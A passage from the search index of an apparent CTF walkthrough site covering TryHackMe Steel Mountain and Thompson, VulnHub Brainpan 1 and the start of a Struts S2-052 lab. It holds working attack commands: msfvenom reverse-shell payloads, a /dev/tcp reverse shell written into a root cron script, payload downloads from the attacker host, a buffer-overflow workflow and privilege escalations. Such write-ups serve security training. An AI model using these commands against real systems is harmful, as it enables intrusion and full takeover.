clipboard \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:22.3]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ cat pwsh.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Sent and execute payload \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:21.6]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ python3 49125.py 10.10.106.253 8080 \"powershell -enc $(vs)\" > /dev/null At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:21.9]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.106.253] 49467 PS C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup> whoami steelmountain\\bill","title":"Rejetto HttpFileServer RCE"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#local-enumeration","text":"Poc code here After enum local machine, I saw that the application IObit has been installed. PS C:\\Program Files (x86)> dir | GET-ACL <snip> IObit BUILTIN\\Administrators STEELMOUNTAIN\\bill Allow Write, Rea... <snip> Search public exploit for IObit with searchsploit. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.8:26.8]~ \u2514\u2500$ searchsploit IObit ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- IObit Advanced SystemCare 10.0.2 - Unquoted Service Path Pri | windows/local/40577.txt <snip> ------------------------------------------------------------- --------------------------------- Shellcodes: No Results Based on exploit windows/local/40577.txt and folder IObit with permission STEELMOUNTAIN\\bill Allow Write, Rea... , I can go to system privilege by create file name to break space when IObit application start. PS C:\\Program Files (x86)> dir IObit <snip> d---- 4/11/2021 5:43 PM Advanced SystemCare d---- 9/26/2019 10:35 PM IObit Uninstaller d---- 9/26/2019 8:18 AM LiveUpdate Checking service running in the system PS C:\\Program Files (x86)> get-service Status Name DisplayName ------ ---- ----------- Running AdvancedSystemC... Advanced SystemCare Service 9 <snip> Testing restart service Advanced SystemCare Service 9 PS C:\\> cmd /c sc stop AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PS C:\\> cmd /c sc start AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 2272 FLAGS :","title":"Local Enumeration"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#unquoted-service-path","text":"Create file reverse shell Advanced.exe with msfvenom \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[0.7:21.4]~ \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f exe -o Advanced.exe Download file Advanced.exe to folder IObit in windows machine. PS C:\\Program Files (x86)\\IObit> powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.32.198/Advanced.exe','C:/Program Files (x86)/IObit/Advanced.exe')\" PS C:\\Program Files (x86)\\IObit> dir Directory: C:\\Program Files (x86)\\IObit Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 4/11/2021 7:25 PM Advanced SystemCare d---- 9/26/2019 10:35 PM IObit Uninstaller d---- 9/26/2019 8:18 AM LiveUpdate -a--- 4/11/2021 7:30 PM 73802 Advanced.exe Restart service Advanced SystemCare Service 9 and at the listener, I got system shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[0.7:21.6]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ sudo nc -nvlp 443 connect to [10.11.32.198] from (UNKNOWN) [10.10.106.253] 49874 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"Unquoted Service Path"},{"location":"walkthrough/tryhackme/Thompson/index.html","text":"TryHackMe Thompson Author: Hades Scripting here VM Details Name Thompson Created by stuxnet Date release 594 days old (9/4/2021) Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.139.145 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,8009,8080 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.139.145 -p22,8009,8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 15:48 +07 Nmap scan report for 10.10.139.145 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA) | 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA) |_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp open http Apache Tomcat 8.5.5 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat/8.5.5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds Apache Tomcat 8.5.5 At port 8080, this is apache tomcat version 8.5.5. I try to login to manager page with some default credentials and when I try with username tomcat password s3cret , I got manager page. Foothold War file deploy shell At the manager page, I can deploy web shell using war file deploy in tomcat server. Create file shell.war with msfvenom \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:26.3]~/walkthrough/tryhackme/thompson \u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f war > shell.war Payload size: 1082 bytes Final size of war file: 1082 bytes Upload file to tomcat server. Go to http://10.10.139.145:8080/shell/ to execute shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:27.2]~/walkthrough/tryhackme/thompson \u2514\u2500$ curl http://10.10.139.145:8080/shell/ At the listener, I got reverse shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:27.3]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.139.145] 50716 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) Privilege Escalation Cron Jobs File Overwrite At the jack's home folder, there is a file named id.sh contain code execute command id and save the result to text.txt file tomcat@ubuntu:/home/jack$ ls id.sh test.txt user.txt tomcat@ubuntu:/home/jack$ cat id.sh #!/bin/bash id > test.txt tomcat@ubuntu:/home/jack$ cat test.txt uid=0(root) gid=0(root) groups=0(root) I know that, admin was create a cron jobs for execute file id.sh . Let's confirm it by list cron jobs. tomcat@ubuntu:/home/jack$ cat /etc/crontab # /etc/crontab: system-wide crontab <snip> * * * * * root cd /home/jack && bash id.sh But file id.sh have privilege 777, can edit by any user. tomcat@ubuntu:/home/jack$ ls -lh id.sh -rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh Add bash reverse shell code to file id.sh . echo 'sh -i >& /dev/tcp/10.11.32.198/443 0>&1' > id.sh Wait a second, at the listener I have root shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.1:27.5]~ \u2514\u2500$ sudo nc -nvlp 443 1 \u2a2f listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.139.145] 50724 sh: 0: can't access tty; job control turned off # whoami root # id uid=0(root) gid=0(root) groups=0(root)","title":"Thompson"},{"location":"walkthrough/tryhackme/Thompson/index.html#tryhackme-thompson","text":"Author: Hades Scripting here","title":"TryHackMe Thompson"},{"location":"walkthrough/tryhackme/Thompson/index.html#vm-details","text":"Name Thompson Created by stuxnet Date release 594 days old (9/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/Thompson/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/Thompson/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.139.145 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,8009,8080 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.139.145 -p22,8009,8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 15:48 +07 Nmap scan report for 10.10.139.145 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA) | 256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA) |_ 256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) |_ajp-methods: Failed to get a valid response for the OPTION request 8080/tcp open http Apache Tomcat 8.5.5 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat/8.5.5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/Thompson/index.html#apache-tomcat-855","text":"At port 8080, this is apache tomcat version 8.5.5. I try to login to manager page with some default credentials and when I try with username tomcat password s3cret , I got manager page.","title":"Apache Tomcat 8.5.5"},{"location":"walkthrough/tryhackme/Thompson/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/Thompson/index.html#war-file-deploy-shell","text":"At the manager page, I can deploy web shell using war file deploy in tomcat server. Create file shell.war with msfvenom \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:26.3]~/walkthrough/tryhackme/thompson \u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f war > shell.war Payload size: 1082 bytes Final size of war file: 1082 bytes Upload file to tomcat server. Go to http://10.10.139.145:8080/shell/ to execute shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:27.2]~/walkthrough/tryhackme/thompson \u2514\u2500$ curl http://10.10.139.145:8080/shell/ At the listener, I got reverse shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.2:27.3]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.139.145] 50716 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)","title":"War file deploy shell"},{"location":"walkthrough/tryhackme/Thompson/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/Thompson/index.html#cron-jobs-file-overwrite","text":"At the jack's home folder, there is a file named id.sh contain code execute command id and save the result to text.txt file tomcat@ubuntu:/home/jack$ ls id.sh test.txt user.txt tomcat@ubuntu:/home/jack$ cat id.sh #!/bin/bash id > test.txt tomcat@ubuntu:/home/jack$ cat test.txt uid=0(root) gid=0(root) groups=0(root) I know that, admin was create a cron jobs for execute file id.sh . Let's confirm it by list cron jobs. tomcat@ubuntu:/home/jack$ cat /etc/crontab # /etc/crontab: system-wide crontab <snip> * * * * * root cd /home/jack && bash id.sh But file id.sh have privilege 777, can edit by any user. tomcat@ubuntu:/home/jack$ ls -lh id.sh -rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh Add bash reverse shell code to file id.sh . echo 'sh -i >& /dev/tcp/10.11.32.198/443 0>&1' > id.sh Wait a second, at the listener I have root shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.1:27.5]~ \u2514\u2500$ sudo nc -nvlp 443 1 \u2a2f listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.139.145] 50724 sh: 0: can't access tty; job control turned off # whoami root # id uid=0(root) gid=0(root) groups=0(root)","title":"Cron Jobs File Overwrite"},{"location":"walkthrough/tryhackme/__init__/index.html","text":"TryHackMe Author: Hades Scripting here VM Details Name Created by Date release days old (/4/2021) Information Gathering Openning Services Foothold Privilege Escalation Local enumeration","title":"TryHackMe"},{"location":"walkthrough/tryhackme/__init__/index.html#tryhackme","text":"Author: Hades Scripting here","title":"TryHackMe"},{"location":"walkthrough/tryhackme/__init__/index.html#vm-details","text":"Name Created by Date release days old (/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/__init__/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/__init__/index.html#openning-services","text":"","title":"Openning Services"},{"location":"walkthrough/tryhackme/__init__/index.html#_1","text":"","title":""},{"location":"walkthrough/tryhackme/__init__/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/__init__/index.html#_2","text":"","title":""},{"location":"walkthrough/tryhackme/__init__/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/__init__/index.html#local-enumeration","text":"","title":"Local enumeration"},{"location":"walkthrough/tryhackme/__init__/index.html#_3","text":"","title":""},{"location":"walkthrough/vulnhub/Brainpan-1/index.html","text":"VulnHub Brainpan: 1 Author: Hades - LeeCyberSec Scripting here VM Details Name Brainpan: 1 Date release 20 Mar 2013 Author superkojiman Series Brainpan Web page brainpan-hacking-challenge Information Gathering Open Services To scan all open ports in Brainpan I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.4]~/scripting \u2514\u2500$ sudo ./enum/all.sh 192.168.11.144 1 \u2a2f [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 192.168.11.144 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 9999,10000 ### Services Enumeration ############################ nmap -sC -sV -Pn 192.168.11.144 -p9999,10000 <snip> PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn't have a title (text/html). <snip> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 52.08 seconds Port 9999 This side require a password to access, I guessed some password and it return access denied . Port 10000 This side look like a normal website may have a listing of the hidden directories. Discovery port 10000 with gobuster and I saw the special uri \"/bin\". \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.9]~/scripting \u2514\u2500$ sudo ./enum/services.sh 192.168.11.144 10000 http ### Web Enumeration (10000) ############################ [+] Files and directories gobuster dir -k -u http://192.168.11.144:10000 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /bin (Status: 301) [Size: 0] [--> /bin/] /index.html (Status: 200) [Size: 215] =============================================================== <snip> [+] All URLs Foothold Buffer Overflow Download \"brainpan.exe\" and view the function in the application using strings . \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.8]~/Downloads \u2514\u2500$ strings brainpan.exe <snip> printf signal strcmp strcpy strlen <snip> Buffer Overflow Attack : [Page 7] The strcpy () function does not stop until it sees a zero (a number zero, '<0') in the source string. Since the source string is longer than 12 bytes, strcpy () will overwrite some portion of the stack above the buffer . This is called buffer overflow . Fuzzing Poc code here \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 0 .5:20.6 ] ~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python fuzzer.py 192 .168.11.135 Client Machine Control EIP Poc code here Create pattern, add it to buffer payload and sent. msf-pattern_create -l 1000 \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.5:20.3]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python eip-finder.py 192.168.11.135 Client Machine Identify the offset msf-pattern_offset -q 35724134 [ * ] Exact match at offset 524 Bad Characters Poc code here \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.3]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python badchars.py 192.168.11.135 Client Machine After review the ESP data, there is only \\x00 bad characters need to encode. JMP ESP Import mona in Immunity Debugger Let's check modules of the process. I saw that the Modules address of brainpan.exe in range [0x3117000:0x3117600] ! mona modules Find the \"JMP ESP\" code address and confirm it in the application. The return address \\x311712f3 ! mona find - s \" \\\\ xff \\\\ xe4\" Reverse Shell Poc code here Create shellcode with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST = 192 .168.11.140 LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"x00\" Open listener in Kali machine sudo nc -nvlp 443 Execute poc.py file \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.8]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python poc.py 192.168.11.135 Back to the Brainpan Server, and execute poc.py . Privilege Escalation Escape wine to get user At the punk folder, I saw a script named checksrv.sh Z:\\home\\puck>type checksrv.sh #!/bin/bash # run brainpan.exe if it stops <snip> cd /home/puck/web /usr/bin/python -m SimpleHTTPServer 10000 fi Python was installed in the Unix machine with full path \"/usr/bin/python\". Let's create a bash shell with python to access to Unix machine. Z: \\h ome \\p uck>/usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" puck@brainpan:~$ id id uid = 1002 ( puck ) gid = 1002 ( puck ) groups = 1002 ( puck ) puck@brainpan:~$ whoami whoami puck puck@brainpan:~$ pwd pwd /home/puck puck@brainpan:~$ Kernel check Check the OS and version puck@brainpan:~$ lsb_release -a lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 12 .10 Release: 12 .10 Codename: quantal puck@brainpan:~$ The version of Ubuntu machine is 12.10, let's check with searchsploit We may exploit kernel to get root, but I am not refer this step. Let's enum more! Sudo and Suid sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User puck may run the following commands on this host: ( root ) NOPASSWD: /home/anansi/bin/anansi_util puck@brainpan:~$ The application /home/anansi/bin/anansi_util allow us run it with root permission. puck@brainpan:~$ sudo /home/anansi/bin/anansi_util sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [ action ] Where [ action ] is one of: - network - proclist - manual [ command ] Let's run this app and check how it work. puck@brainpan:~$ sudo /home/anansi/bin/anansi_util manual whoami sudo /home/anansi/bin/anansi_util manual whoami No manual entry for manual WARNING: terminal is not fully functional - ( press RETURN ) WHOAMI ( 1 ) User Commands WHOAMI ( 1 ) <snip> GNU coreutils home page: <http://www.gnu.org/software/coreutils/> Manual page whoami ( 1 ) line 1 ( press h for help or q to quit ) In here, after quit the main page, we can execute !/bin/bash to run shell within the privilege. AUTHOR Written by Richard Mlynarik. REPORTING BUGS Report whoami bugs to bug-coreutils@gnu.org GNU coreutils home page: <http://www.gnu.org/software/coreutils/> Manual page whoami ( 1 ) line 1 ( press h for help or q to quit ) !/bin/bash !/bin/bash root@brainpan:/usr/share/man# whoami whoami root root@brainpan:/usr/share/man#","title":"Brainpan 1"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#vulnhub-brainpan-1","text":"Author: Hades - LeeCyberSec Scripting here","title":"VulnHub Brainpan: 1"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#vm-details","text":"Name Brainpan: 1 Date release 20 Mar 2013 Author superkojiman Series Brainpan Web page brainpan-hacking-challenge","title":"VM Details"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#open-services","text":"To scan all open ports in Brainpan I run nmap with -p- options and enum service at each port. \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.4]~/scripting \u2514\u2500$ sudo ./enum/all.sh 192.168.11.144 1 \u2a2f [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 192.168.11.144 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 9999,10000 ### Services Enumeration ############################ nmap -sC -sV -Pn 192.168.11.144 -p9999,10000 <snip> PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn't have a title (text/html). <snip> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 52.08 seconds","title":"Open Services"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#port-9999","text":"This side require a password to access, I guessed some password and it return access denied .","title":"Port 9999"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#port-10000","text":"This side look like a normal website may have a listing of the hidden directories. Discovery port 10000 with gobuster and I saw the special uri \"/bin\". \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.9]~/scripting \u2514\u2500$ sudo ./enum/services.sh 192.168.11.144 10000 http ### Web Enumeration (10000) ############################ [+] Files and directories gobuster dir -k -u http://192.168.11.144:10000 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /bin (Status: 301) [Size: 0] [--> /bin/] /index.html (Status: 200) [Size: 215] =============================================================== <snip> [+] All URLs","title":"Port 10000"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#buffer-overflow","text":"Download \"brainpan.exe\" and view the function in the application using strings . \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.8]~/Downloads \u2514\u2500$ strings brainpan.exe <snip> printf signal strcmp strcpy strlen <snip> Buffer Overflow Attack : [Page 7] The strcpy () function does not stop until it sees a zero (a number zero, '<0') in the source string. Since the source string is longer than 12 bytes, strcpy () will overwrite some portion of the stack above the buffer . This is called buffer overflow .","title":"Buffer Overflow"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#fuzzing","text":"Poc code here \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 0 .5:20.6 ] ~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python fuzzer.py 192 .168.11.135 Client Machine","title":"Fuzzing"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#control-eip","text":"Poc code here Create pattern, add it to buffer payload and sent. msf-pattern_create -l 1000 \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.5:20.3]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python eip-finder.py 192.168.11.135 Client Machine Identify the offset msf-pattern_offset -q 35724134 [ * ] Exact match at offset 524","title":"Control EIP"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#bad-characters","text":"Poc code here \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.3]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python badchars.py 192.168.11.135 Client Machine After review the ESP data, there is only \\x00 bad characters need to encode.","title":"Bad Characters"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#jmp-esp","text":"Import mona in Immunity Debugger Let's check modules of the process. I saw that the Modules address of brainpan.exe in range [0x3117000:0x3117600] ! mona modules Find the \"JMP ESP\" code address and confirm it in the application. The return address \\x311712f3 ! mona find - s \" \\\\ xff \\\\ xe4\"","title":"JMP ESP"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#reverse-shell","text":"Poc code here Create shellcode with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST = 192 .168.11.140 LPORT = 443 EXITFUNC = thread -f c \u2013e x86/shikata_ga_nai -b \"x00\" Open listener in Kali machine sudo nc -nvlp 443 Execute poc.py file \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.6:20.8]~/walkthrough/vulnhub/brainpan-1 \u2514\u2500$ python poc.py 192.168.11.135 Back to the Brainpan Server, and execute poc.py .","title":"Reverse Shell"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#escape-wine-to-get-user","text":"At the punk folder, I saw a script named checksrv.sh Z:\\home\\puck>type checksrv.sh #!/bin/bash # run brainpan.exe if it stops <snip> cd /home/puck/web /usr/bin/python -m SimpleHTTPServer 10000 fi Python was installed in the Unix machine with full path \"/usr/bin/python\". Let's create a bash shell with python to access to Unix machine. Z: \\h ome \\p uck>/usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\" puck@brainpan:~$ id id uid = 1002 ( puck ) gid = 1002 ( puck ) groups = 1002 ( puck ) puck@brainpan:~$ whoami whoami puck puck@brainpan:~$ pwd pwd /home/puck puck@brainpan:~$","title":"Escape wine to get user"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#kernel-check","text":"Check the OS and version puck@brainpan:~$ lsb_release -a lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 12 .10 Release: 12 .10 Codename: quantal puck@brainpan:~$ The version of Ubuntu machine is 12.10, let's check with searchsploit We may exploit kernel to get root, but I am not refer this step. Let's enum more!","title":"Kernel check"},{"location":"walkthrough/vulnhub/Brainpan-1/index.html#sudo-and-suid","text":"sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User puck may run the following commands on this host: ( root ) NOPASSWD: /home/anansi/bin/anansi_util puck@brainpan:~$ The application /home/anansi/bin/anansi_util allow us run it with root permission. puck@brainpan:~$ sudo /home/anansi/bin/anansi_util sudo /home/anansi/bin/anansi_util Usage: /home/anansi/bin/anansi_util [ action ] Where [ action ] is one of: - network - proclist - manual [ command ] Let's run this app and check how it work. puck@brainpan:~$ sudo /home/anansi/bin/anansi_util manual whoami sudo /home/anansi/bin/anansi_util manual whoami No manual entry for manual WARNING: terminal is not fully functional - ( press RETURN ) WHOAMI ( 1 ) User Commands WHOAMI ( 1 ) <snip> GNU coreutils home page: <http://www.gnu.org/software/coreutils/> Manual page whoami ( 1 ) line 1 ( press h for help or q to quit ) In here, after quit the main page, we can execute !/bin/bash to run shell within the privilege. AUTHOR Written by Richard Mlynarik. REPORTING BUGS Report whoami bugs to bug-coreutils@gnu.org GNU coreutils home page: <http://www.gnu.org/software/coreutils/> Manual page whoami ( 1 ) line 1 ( press h for help or q to quit ) !/bin/bash !/bin/bash root@brainpan:/usr/share/man# whoami whoami root root@brainpan:/usr/share/man#","title":"Sudo and Suid"},{"location":"walkthrough/vulnhub/S2-052/index.html","text":"Pentester Lab: S2-052 Author: Hades Scripting here Enumeration Open Services This is a web application, let's go with gobuster to enum more the hidden. \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.4 ] ~ \u2514\u2500$ gobuster dir -u http://192.168.110.137 -w /usr/share/seclists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @_FireFart_ ) =============================================================== [ + ] Url: http://192.168.110.137 [ + ] Threads: 10 [ + ] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [ + ] Status codes: 200 ,204,301,302,307,401,403 [ + ] User Agent: gobuster/3.0.1 [ + ] Timeout: 10s =============================================================== 2021 /01/27 22 :14:58 Starting gobuster =============================================================== /META-INF ( Status: 302 ) /WEB-INF ( Status: 302 ) /css ( Status: 302 ) /fonts ( Status: 302 ) /orders ( Status: 200 ) =============================================================== 2021 /01/27 22 :15:01 Finished =============================================================== Go to uri \"/orders\" and check how app work. Orders view-source Foothold CVE-2017-9805 Look around in the internet, I found CVE-2017-9805 with key word \"orders.xhtml exploit\". struts-pwn - CVE-2017-9805 Exploit Let's use searchsploit to find more about this vulnerability. searchsploit \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.1 ] ~ \u2514\u2500$ searchsploit struts rest ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi | multiple/remote/39919.rb Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi | multiple/remote/43382.py Apache Struts 2 .5 < 2 .5.12 - REST Plugin XStream Remote Code Execution | linux/remote/42627.py ------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.1 ] 